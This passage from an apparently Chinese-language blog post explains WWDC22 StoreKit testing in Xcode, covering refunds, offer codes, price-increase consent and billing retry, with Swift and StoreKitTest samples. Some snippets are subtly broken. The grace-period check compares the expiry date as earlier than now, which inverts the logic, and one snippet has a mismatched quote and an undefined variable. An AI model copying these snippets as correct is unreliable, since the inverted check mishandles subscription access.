class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">RefundView</span>: <span class="title">View</span> </span>&#123;</span><br><span class="line">    <span class="meta">@State</span> <span class="keyword">private</span> <span class="keyword">var</span> selectedTransactionID: <span class="type">UInt64</span>?</span><br><span class="line">    <span class="meta">@State</span> <span class="keyword">private</span> <span class="keyword">var</span> refundSheetIsPresented <span class="operator">=</span> <span class="literal">false</span></span><br><span class="line">    <span class="meta">@Environment</span>(\.dismiss) <span class="keyword">private</span> <span class="keyword">var</span> dismiss</span><br><span class="line">    <span class="keyword">var</span> body: <span class="keyword">some</span> <span class="type">View</span> &#123;</span><br><span class="line">        <span class="type">Button</span> &#123;</span><br><span class="line">            refundSheetIsPresented <span class="operator">=</span> <span class="literal">true</span></span><br><span class="line">        &#125; label: &#123;</span><br><span class="line">            <span class="type">Text</span>(<span class="string">&quot;Request a refund&quot;</span>)</span><br><span class="line">                .bold()</span><br><span class="line">                .padding(.vertical, <span class="number">5</span>)</span><br><span class="line">                .frame(maxWidth: .infinity)</span><br><span class="line">        &#125;</span><br><span class="line">        .buttonStyle(.borderedProminent)</span><br><span class="line">        .padding([.horizontal, .bottom])</span><br><span class="line">        .disabled(selectedTransactionID <span class="operator">==</span> <span class="literal">nil</span>)</span><br><span class="line">        .refundRequestSheet(</span><br><span class="line">            for: selectedTransactionID <span class="operator">??</span> <span class="number">0</span>,</span><br><span class="line">            isPresented: <span class="variable">$refundSheetIsPresented</span></span><br><span class="line">        ) &#123; result <span class="keyword">in</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">case</span> .success(.success) <span class="operator">=</span> result &#123;</span><br><span class="line">                dismiss()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在本地订单交易管理器，也可以点击 <code>Refund Purchases</code> 图标进行退款。</p><p><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-12.png" alt="WWDC22-Xcode-StoreKit-Testing-12"></p><p>那么退款成功后，开发者需要处理退款后的 app 的业务逻辑测试，在 StoreKit 2 中，使用 <code>Transaction.updates</code> 监听所有交易的更新，更新交易的 <a href="https://developer.apple.com/documentation/storekit/transaction/revocationreason">revocationReason</a> 字段是一个结构体，其中 <code>.developerIssue</code> 和 <code>.other</code> 与上上图中可选择的退款原因是相对应的，所以开发者很容易对这两个撤销原因进行测试。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="keyword">await</span> update <span class="keyword">in</span> <span class="type">Transaction</span>.updates &#123;</span><br><span class="line">    <span class="keyword">let</span> transaction <span class="operator">=</span> <span class="keyword">try</span> update.payloadValue</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> revocationDate <span class="operator">=</span> transaction.revocationDate,</span><br><span class="line">     <span class="keyword">let</span> revocationReason <span class="operator">=</span> transaction.revocationReason &#123;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;<span class="subst">\(transaction.productID)</span> revoked on <span class="subst">\(revocationDate)</span>&quot;</span>)</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">switch</span> revocationReason &#123;</span><br><span class="line">        <span class="keyword">case</span> .developerIssue: <span class="operator">&lt;</span>#<span class="type">Handle</span> developer issue#<span class="operator">&gt;</span></span><br><span class="line">        <span class="keyword">case</span> .other: <span class="operator">&lt;</span>#<span class="type">Handle</span> other issue#<span class="operator">&gt;</span></span><br><span class="line">        <span class="keyword">default</span>: <span class="operator">&lt;</span>#<span class="type">Handle</span> unknown reason#<span class="operator">&gt;</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="operator">&lt;</span>#<span class="type">Revoke</span> access to the product#<span class="operator">&gt;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="operator">&lt;</span>#<span class="operator">...</span>#<span class="operator">&gt;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，退款测试的环境要求如下：</p><table><thead><tr><th></th><th>Xcode</th><th>Sandbox</th></tr></thead><tbody><tr><td>iOS and iPadOS</td><td>15.2</td><td>15.0</td></tr><tr><td>macOS</td><td>12.1</td><td>12.0</td></tr></tbody></table><h3 id="4-2-优惠代码测试（Offer-codes）"><a href="#4-2-优惠代码测试（Offer-codes）" class="headerlink" title="4.2 优惠代码测试（Offer codes）"></a>4.2 优惠代码测试（Offer codes）</h3><p>关于 <code>Offer codes</code>（优惠代码）我们这里就略过了，读者可以查看苹果文档了解 <a href="https://developer.apple.com/cn/app-store/subscriptions/#offer-types">优惠代码</a>。</p><p>优惠代码测试的测试，首先是在 StoreKit 配置文件的订阅商品中点击添加 Offer Codes 栏的 <code>+</code> 进行配置：</p><p><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-13.png" alt="WWDC22-Xcode-StoreKit-Testing-13"></p><p>在 iOS 14 中就增加 <a href="https://developer.apple.com/documentation/storekit/skpaymentqueue/3566726-presentcoderedemptionsheet">presentCodeRedemptionSheet()</a> 接口，实现 app 内兑换优惠代码：</p><p><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-14.png" alt="WWDC22-Xcode-StoreKit-Testing-14"></p><p>而在 SwiftUI 中需要 iOS 16+ 中通过 <a href="https://developer.apple.com/documentation/swiftui/view/offercoderedemption(ispresented:oncompletion:)">offerCodeRedemption(isPresented:onCompletion:)</a> 接口实现 App 内兑换优惠代码的示例：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SubscriptionPurchaseView</span>: <span class="title">View</span> </span>&#123;</span><br><span class="line">    <span class="meta">@State</span> <span class="keyword">private</span> <span class="keyword">var</span> redeemSheetIsPresented <span class="operator">=</span> <span class="literal">false</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">var</span> body: <span class="keyword">some</span> <span class="type">View</span> &#123;</span><br><span class="line">        <span class="type">Button</span>(<span class="string">&quot;Redeem an offer&quot;</span>) &#123;</span><br><span class="line">            redeemSheetIsPresented <span class="operator">=</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">        .buttonStyle(.borderless)</span><br><span class="line">        .frame(maxWidth: .infinity)</span><br><span class="line">        .padding(.vertical)</span><br><span class="line">        .offerCodeRedeemSheet(isPresented: <span class="variable">$redeemSheetIsPresented</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>兑换优惠代码成功的交易，可以在本地订单交易管理器，交易订单的右侧栏 <code>Renewals</code> 标签中，看到订阅更新的信息。<br><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-15.png" alt="WWDC22-Xcode-StoreKit-Testing-15"></p><p>那么开发者需要处理兑换优惠代码后的 app 的业务逻辑测试，在 StoreKit 2 中，使用 <code>Transaction.updates</code> 和 <code>Product.SubscriptionInfo.Status.updates</code> 监听所有订阅商品交易的状态更新：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="keyword">await</span> verificationResult <span class="keyword">in</span> <span class="type">Transaction</span>.updates &#123;</span><br><span class="line">    <span class="keyword">guard</span> <span class="keyword">case</span> .verified(<span class="keyword">let</span> transaction) <span class="operator">=</span> verificationResult <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="operator">&lt;</span>#<span class="type">Handle</span> failed verification#<span class="operator">&gt;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="operator">&lt;</span>#<span class="type">Handle</span> updated transaction#<span class="operator">&gt;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="keyword">await</span> updatedStatus <span class="keyword">in</span> <span class="type">Product</span>.<span class="type">SubscriptionInfo</span>.<span class="type">Status</span>.updates &#123;</span><br><span class="line">    <span class="keyword">guard</span> <span class="keyword">case</span> .verified(<span class="keyword">let</span> renewalInfo) <span class="operator">=</span> updatedStatus.renewalInfo <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="operator">&lt;</span>#<span class="type">Handle</span> failed verification#<span class="operator">&gt;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="operator">&lt;</span>#<span class="type">Handle</span> updated status#<span class="operator">&gt;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>Product.SubscriptionInfo.Status.updates</code> 接口中返回的交易字段 <code>offerType</code> 可以确认订阅的优惠类型，关于 <a href="https://developer.apple.com/documentation/storekit/transaction/offertype">OfferType</a> 优惠类型可以阅读文档：<a href="https://developer.apple.com/cn/app-store/subscriptions/#offer-types">优惠类型</a>。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="keyword">await</span> status <span class="keyword">in</span> <span class="type">Product</span>.<span class="type">SubscriptionInfo</span>.<span class="type">Status</span>.updates &#123;</span><br><span class="line">    <span class="keyword">let</span> transaction <span class="operator">=</span> <span class="keyword">try</span> status.transaction.payloadValue</span><br><span class="line">    <span class="keyword">let</span> renewalInfo <span class="operator">=</span> <span class="keyword">try</span> status.renewalInfo.payloadValue</span><br><span class="line">    </span><br><span class="line">    <span class="operator">&lt;</span>#<span class="type">Check</span> active current offer#<span class="operator">&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> nextOfferType <span class="operator">=</span> renewalInfo.offerType &#123;</span><br><span class="line">        <span class="keyword">switch</span> currentType &#123;</span><br><span class="line">        <span class="keyword">case</span> .introductory: <span class="operator">&lt;</span>#<span class="type">Handle</span> introductory offer#<span class="operator">&gt;</span></span><br><span class="line">        <span class="keyword">case</span> .promotional: <span class="operator">&lt;</span>#<span class="type">Handle</span> promotional offer#<span class="operator">&gt;</span></span><br><span class="line">        <span class="keyword">case</span> .code:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Customer has <span class="subst">\(renewalInfo.offerID)</span> queued&quot;</span>)</span><br><span class="line">            <span class="operator">&lt;</span>#<span class="type">Handle</span> offer <span class="keyword">for</span> codes#<span class="operator">&gt;</span></span><br><span class="line">        <span class="keyword">default</span>: <span class="operator">&lt;</span>#<span class="type">Handle</span> unknown offer type#<span class="operator">&gt;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">self</span>.hasQueuedOffer <span class="operator">=</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="operator">&lt;</span>#<span class="operator">...</span>#<span class="operator">&gt;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>优惠代码（Offer Codes）测试的 StoreKit 配置在 Xcode 13.3+ 以上就可以设置，所以搭配的测试的设备系统必须是 iOS 15.4 或 iPadOS 15.4 以上。</p><h3 id="4-3-订阅涨价测试（Price-increases）"><a href="#4-3-订阅涨价测试（Price-increases）" class="headerlink" title="4.3 订阅涨价测试（Price increases）"></a>4.3 订阅涨价测试（Price increases）</h3><p>随着 App 订阅的流行，很多 App 的订阅可能因为业务或者服务器成本等原因，提高订阅价格。而部分订阅涨价需要用户同意才能续订，今年 WWDC22 苹果推出了 StoreKit Message 接口，开发者可以在 app 内显示涨价提示：</p><p><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-16.png" alt="WWDC22-Xcode-StoreKit-Testing-16"></p><p>关于 StoreKit Message 接口介绍，可以参考 <a href="https://mp.weixin.qq.com/s/zzeFoUKA7jXcCaKtcgaiiQ">WWDC22 - 探索 In-App Purchase 新特性</a>。StoreKit Message 接口代码示例：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">var</span> pendingMessages: [<span class="type">Message</span>] <span class="operator">=</span> []</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">func</span> <span class="title">updatesLoop</span>()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">await</span> message <span class="keyword">in</span> <span class="type">Message</span>.messages &#123;</span><br><span class="line">      <span class="keyword">if</span> <span class="operator">&lt;</span>#<span class="type">Check</span> <span class="keyword">if</span> sensitive view <span class="keyword">is</span> presented#<span class="operator">&gt;</span>,</span><br><span class="line">         <span class="keyword">let</span> display: <span class="type">DisplayMessageAction</span> <span class="operator">=</span> <span class="operator">&lt;</span>#<span class="type">Get</span> display message action#<span class="operator">&gt;</span> &#123;</span><br><span class="line">           <span class="keyword">try?</span> display(message)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        pendingMessages.append(message)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于提高自动续期订阅价格可以参考文档：</p><ul><li><a href="https://help.apple.com/app-store-connect/#/devc9870599e">管理自动续期订阅的定价 - App Store Connect 帮助</a></li><li><a href="https://developer.apple.com/cn/news/?id=tpgp89cl">订阅通知更新 - Apple Developer</a></li></ul><p>那么，要怎么提高自动续期订阅价格，在本地订单交易管理器可以点击图标或者右键点击 <code>Request Price Increase Consent</code> 按钮，这样就表示这个商品要提高下一个订阅周期的订阅价格：</p><p><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-17.png" alt="WWDC22-Xcode-StoreKit-Testing-17"></p><p>因为除了利用 StoreKit Message 提示弹窗中点击同意涨价外，用户也可能会通过电子邮件等其它方式对价格上涨做出选择，所以为了模拟这个场景，可以在本地订单交易管理器，点击 <code>Approve</code>（批准）和 <code>Decline</code>（拒绝）按钮来模拟用户的选择。</p><p><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-18.png" alt="WWDC22-Xcode-StoreKit-Testing-18"></p><p>最后，可以通过 <code>priceIncreaseStatus</code> 判断用户是否同意涨价，通过 <code>expirationReason</code> 字段的 <code>.didNotConsentToPriceIncrease</code> 类型判断用户没有同意涨价。在 StoreKit 2 和 iOS 15 实现的代码示例：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="keyword">await</span> status <span class="keyword">in</span> <span class="type">Product</span>.<span class="type">SubscriptionInfo</span>.<span class="type">Status</span>.updates &#123;</span><br><span class="line">    <span class="keyword">let</span> renewalInfo <span class="operator">=</span> <span class="keyword">try</span> status.renewalInfo.payloadValue</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> renewalInfo.priceIncreaseStatus <span class="operator">==</span> .agreed &#123;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Customer consented to price increase&quot;</span>)</span><br><span class="line">        <span class="operator">&lt;</span>#<span class="type">Handle</span> consented to price increase#<span class="operator">&gt;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> renewalInfo.expirationReason <span class="operator">==</span> .didNotConsentToPriceIncrease &#123;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Customer did not consent to price increase&quot;</span>)</span><br><span class="line">        <span class="operator">&lt;</span>#<span class="type">Handle</span> expired due to not consenting to price increase#<span class="operator">&gt;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="operator">&lt;</span>#<span class="operator">...</span>#<span class="operator">&gt;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 iOS 15.4 可以在 <a href="https://developer.apple.com/documentation/storekittest">StoreKitTest Framework</a> 中编写单元测试代码进行涨价测试：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> session: <span class="type">SKTestSession</span> <span class="operator">=</span> <span class="keyword">try</span> <span class="type">SKTestSession</span>(configurationFileNamed: <span class="string">&quot;&lt;#Configuration name#&gt;&quot;</span>)</span><br><span class="line">session.disableDialogs <span class="operator">=</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>#<span class="type">Purchase</span> a subscription#<span class="operator">&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> transaction: <span class="type">SKTestTransaction</span>! <span class="operator">=</span> session.allTransactions().first</span><br><span class="line">session.requestPriceIncreaseConsentForTransaction(identifier: transaction.identifier)</span><br><span class="line"></span><br><span class="line">transaction <span class="operator">=</span> session.allTransactions().first</span><br><span class="line"><span class="type">XCTAssertTrue</span>(transaction.isPendingPriceIncreaseConsent)</span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>#<span class="type">Assert</span> app updates <span class="keyword">for</span> pending price increase#<span class="operator">&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Write a test case for consenting and cancelling due to price increase:</span></span><br><span class="line"></span><br><span class="line">session.consentToPriceIncreaseForTransaction(identifier: transaction.identifier)</span><br><span class="line"></span><br><span class="line"><span class="comment">// OR</span></span><br><span class="line"></span><br><span class="line">session.declinePriceIncreaseForTransaction(identifier: transaction.identifier)</span><br><span class="line">session.expireSubscription(productIdentifier: <span class="string">&quot;&lt;#Product ID#&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>#<span class="type">Assert</span> app updates <span class="keyword">for</span> finished price increase#<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><p>订阅涨价测试支持在 Xcode 13.3 以上使用：</p><table><thead><tr><th></th><th>Status</th><th>Message</th></tr></thead><tbody><tr><td>iOS and iPadOS</td><td>15.4</td><td>有</td></tr><tr><td>macOS</td><td>12.3</td><td>无</td></tr><tr><td>watchOS</td><td>8.5</td><td>无</td></tr><tr><td>tvOS</td><td>15.4</td><td>无</td></tr></tbody></table><blockquote><p>注：其中 StoreKit Message 功能只有 iOS 16 或 iPadOS 16 以上支持，其它系统暂不支持。</p></blockquote><h3 id="4-4-扣费重试和宽限期（Billing-retry-and-grace-period"><a href="#4-4-扣费重试和宽限期（Billing-retry-and-grace-period" class="headerlink" title="4.4 扣费重试和宽限期（Billing retry and grace period)"></a>4.4 扣费重试和宽限期（Billing retry and grace period)</h3><p>扣费重试一般是出现在玩家的银行卡信息过期或者绑定的支付方式过期或撤销等，导致订阅无法按时续期，系统会进行扣费重试。如果重试扣费成功，或者用户续费，则订阅续订成功：</p><p><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-19.png" alt="WWDC22-Xcode-StoreKit-Testing-19"></p><p>默认情况下扣费重试阶段，用户的订阅服务已经过期，导致用户无法使用服务。为了解决扣费重试阶段，用户还能享受订阅服务，苹果提供了一个过渡阶段：<code>Grace period</code>（宽限期），在宽限期内订阅服务可继续享受。</p><p><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-20.png" alt="WWDC22-Xcode-StoreKit-Testing-20"></p><p>要实现扣费重试和宽限期的测试，可以在 Xcode 中分别选择 <code>Enable Billing Retry on Renewal</code> 和 <code>Enable Billing Grace Period</code>：</p><p><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-21.png" alt="WWDC22-Xcode-StoreKit-Testing-21"></p><blockquote><p>注：为了加速订阅过期时间，可以在 <code>Subscription Renewal Rate</code> 选择更快的订阅过期时间，这样更快的进入模拟的测试阶段。</p></blockquote><p>最后，要模拟解决扣费失败后成功的场景，可以在本地订单交易管理器中，点击 <code>Resolve Issues</code> 表示解决扣费问题，让扣费成功后进入到下一个订阅周期中。</p><p><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-22.png" alt="WWDC22-Xcode-StoreKit-Testing-22"></p><p>在代码逻辑中处理，<code>gracePeriodExpirationDate</code> 字段的时间小于当前时间，就表示订阅在宽限期内，允许用户继续享受订阅服务。而 <code>isInBillingRetry</code> 字段，则表示扣费重试阶段。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="keyword">await</span> status <span class="keyword">in</span> <span class="type">Product</span>.<span class="type">SubscriptionInfo</span>.<span class="type">Status</span>.updates &#123;</span><br><span class="line">    <span class="keyword">let</span> renewalInfo <span class="operator">=</span> <span class="keyword">try</span> status.renewalInfo.payloadValue</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> gracePeriodExpirationDate <span class="operator">=</span> renewalInfo.gracePeriodExpirationDate,</span><br><span class="line">       gracePeriodExpirationDate <span class="operator">&lt;</span> .now &#123;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;In grace period until <span class="subst">\(gracePeriodExpirationDate)</span>”)</span></span><br><span class="line"><span class="string">        &lt;#Allow access to subscription#&gt;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    else if renewalInfo.isInBillingRetry &#123;</span></span><br><span class="line"><span class="string">        &lt;#Handle billing retry#&gt;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;#...#&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>在订阅扣费重试阶段，可以提示或引导用户解决扣费失败的问题。具体来说，可以引导用户打开链接 <code>https://apps.apple.com/account/billing</code> 会跳转到 App Store 用户账号的 <code>管理付款方式</code>，从而解决问题。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SubscriptionStatusView</span>: <span class="title">View</span> </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> currentSubscription: <span class="type">Product</span></span><br><span class="line">    <span class="keyword">let</span> status: <span class="type">Product</span>.<span class="type">SubscriptionInfo</span>.<span class="type">Status</span></span><br><span class="line">    <span class="meta">@Environment</span>(\.openURL) <span class="keyword">var</span> openURL</span><br><span class="line">    <span class="keyword">var</span> body: <span class="keyword">some</span> <span class="type">View</span> &#123;</span><br><span class="line">        <span class="type">Section</span>(<span class="string">&quot;Your Subscription&quot;</span>) &#123;</span><br><span class="line">            <span class="operator">&lt;</span>#<span class="operator">...</span>#<span class="operator">&gt;</span></span><br><span class="line">            <span class="keyword">if</span> status.state <span class="operator">==</span> .inBillingRetryPeriod <span class="operator">||</span> status.state <span class="operator">==</span> .inGracePeriod &#123;</span><br><span class="line">                <span class="type">VStack</span> &#123;</span><br><span class="line">                    <span class="type">Text</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    There was a problem renewing your subscription. Open the App Store to</span></span><br><span class="line"><span class="string">                    update your payment information.</span></span><br><span class="line"><span class="string">                    &quot;&quot;&quot;</span>)</span><br><span class="line">                    <span class="type">Button</span>(<span class="string">&quot;Open the App Store&quot;</span>) &#123;</span><br><span class="line">                        openURL(<span class="type">URL</span>(string: <span class="string">&quot;https://apps.apple.com/account/billing&quot;</span>)<span class="operator">!</span>)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 iOS 15.4 以上可以用 <a href="https://developer.apple.com/documentation/storekittest">StoreKitTest Framework</a> 中编写单元测试代码实现扣费重试测试：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> session: <span class="type">SKTestSession</span> <span class="operator">=</span> <span class="keyword">try</span> <span class="type">SKTestSession</span>(configurationFileNamed: <span class="string">&quot;&lt;#Configuration name#&gt;&quot;</span>)</span><br><span class="line">session.billingGracePeriodIsEnabled <span class="operator">=</span> <span class="literal">true</span></span><br><span class="line">session.shouldEnterBillingRetryOnRenewal <span class="operator">=</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>#<span class="type">Purchase</span> a subscription#<span class="operator">&gt;</span></span><br><span class="line"></span><br><span class="line">wait(for: [<span class="operator">&lt;</span>#<span class="type">XCTExpectation</span>#<span class="operator">&gt;</span>], timeout: <span class="number">60</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> transaction: <span class="type">SKTestTransaction</span>! <span class="operator">=</span> session.allTransactions().first</span><br><span class="line"><span class="type">XCTAssertTrue</span>(transaction.hasPurchaseIssue)</span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>#<span class="type">Assert</span> app still allows access to subscription due to grace period#<span class="operator">&gt;</span></span><br><span class="line"></span><br><span class="line">wait(for: [<span class="operator">&lt;</span>#<span class="type">XCTExpectation</span>#<span class="operator">&gt;</span>], timeout: <span class="number">60</span>)</span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>#<span class="type">Assert</span> app detects billing retry and no longer allows access to subscription#<span class="operator">&gt;</span></span><br><span class="line"></span><br><span class="line">session.resolveIssueForTransaction(identifier: transaction.identifier)</span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>#<span class="type">Assert</span> app allows access to subscription#<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><p>订阅扣费重试测试支持在 Xcode 13.3 以上使用：</p><table><thead><tr><th></th><th>Xcode 13.3</th><th>Sandbox</th></tr></thead><tbody><tr><td>iOS and iPadOS</td><td>15.4</td><td>16.0</td></tr><tr><td>macOS</td><td>12.3</td><td>无</td></tr><tr><td>watchOS</td><td>8.5</td><td>无</td></tr><tr><td>tvOS</td><td>15.4</td><td>无</td></tr><tr><td>Server</td><td>N/A</td><td>有</td></tr></tbody></table><blockquote><p>注：订阅扣费重试，Sandbox 环境下，苹果会发送 App Store Server Notifications 订阅状态变更的通知，如 <code>DID_FAIL_TO_RENEW</code>/<code>EXPIRED</code>/<code>BILLING_RETRY</code>。而 Xcode 